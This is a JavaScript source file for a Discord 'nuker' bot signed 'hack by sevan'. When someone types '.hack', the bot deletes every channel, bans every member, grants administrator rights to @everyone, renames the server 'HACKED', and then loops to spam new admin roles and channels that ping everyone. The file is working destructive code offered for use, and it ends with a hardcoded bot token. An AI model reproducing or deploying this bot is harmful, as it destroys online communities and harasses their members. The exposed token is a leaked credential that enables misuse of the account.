const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////

          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('hack by sevan');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})
///created by black jack 
client.on('message', message => {
    if (message.content.toLowerCase() === prefix + "hack") {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach(m =>{
                    m.ban()
                })
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("");
        message.guild.setName('HACKED');
        setTimeout(function() {
            setInterval(() => {
          
                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => {
                  
                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => { 
                channel.send('@everyone HACK BY ahmad ownershipk de la qnr ban :joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
                   )  
    }
}
          )

 ////codaka drwst krawa lalayan black jack

client.login("ODAyOTI3NTMzMDcwMzUyNDI1.YA2WiQ.FJEcasI-CBtEiLg4iwnZq7Ms7kY")
          